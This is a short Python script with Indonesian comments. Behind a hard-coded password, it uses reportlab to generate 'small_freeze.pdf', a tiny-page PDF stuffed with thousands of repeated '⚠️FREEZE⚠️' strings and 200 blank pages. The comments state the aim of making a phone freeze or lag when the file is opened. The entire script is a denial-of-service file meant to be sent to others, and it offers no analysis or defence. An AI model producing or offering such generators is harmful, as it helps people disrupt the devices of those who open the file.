import sys
from reportlab.pdfgen import canvas

# Meminta kata sandi
password = input("Masukkan kata sandi untuk membuat PDF: ")

if password != "admin123":
    print("Sandi salah! Akses ditolak.")
    sys.exit()

print("Sandi benar. Membuat PDF...")

# Nama file PDF
pdf_path = "small_freeze.pdf"

# Membuat PDF kecil yang menyebabkan HP freeze saat dibuka
c = canvas.Canvas(pdf_path, pagesize=(50, 50))  # Ukuran halaman super kecil
c.setFont("Helvetica", 1)  # Gunakan font sekecil mungkin

# Memastikan Termux tidak hang saat membuat file
for i in range(5000):  # Jumlah teks cukup besar tapi tidak overload
    c.drawString(5, 45 - (i % 45), "⚠️FREEZE⚠️" * 50)  # Memaksimalkan teks berat

# Tambahkan banyak halaman kosong agar membuka file menyebabkan lag
for _ in range(200):  
    c.showPage()

c.save()

print(f"PDF berhasil dibuat: {pdf_path}")
print("PDF siap beraksi! Coba buka file tersebut.")